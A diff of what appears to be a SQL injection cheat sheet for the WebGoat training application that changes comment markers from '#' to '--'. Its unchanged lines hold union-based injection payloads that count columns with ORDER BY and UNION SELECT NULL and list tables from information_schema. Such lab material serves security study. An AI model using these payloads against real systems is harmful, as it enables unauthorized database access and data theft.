@@ -49,9 +49,9 @@ Get Number of Columns First (Required for further attacks)
 '+ORDER+BY+?............#
 
 
-# Method 2
-# Increment ",NULL" by adding additional ",NULL" and monitor response for different responses or errors.
-# If the error is returned on "'+UNION SELECT NULL,NULL,NULL,NULL#" then the table has 3 columns. 
+-- Method 2
+-- Increment ",NULL" by adding additional ",NULL" and monitor response for different responses or errors.
+-- If the error is returned on "'+UNION SELECT NULL,NULL,NULL,NULL#" then the table has 3 columns. 
 '+UNION+SELECT+NULL#
 '+UNION+SELECT+NULL,NULL#
 '+UNION+SELECT+NULL,NULL,NULL#
@@ -92,7 +92,7 @@ version()
 Get Tables in Database
 ----------------------
 ```sql
-# Table has 3 columns as identified above for this reason there are two "NULL" required. 
+-- Table has 3 columns as identified above for this reason there are two "NULL" required. 
 '+UNION+ALL+SELECT+NULL,NULL,concat(TABLE_NAME)+FROM+information_schema.TABLES+WHERE+table_schema='webgoat_coins'#
 ```
 
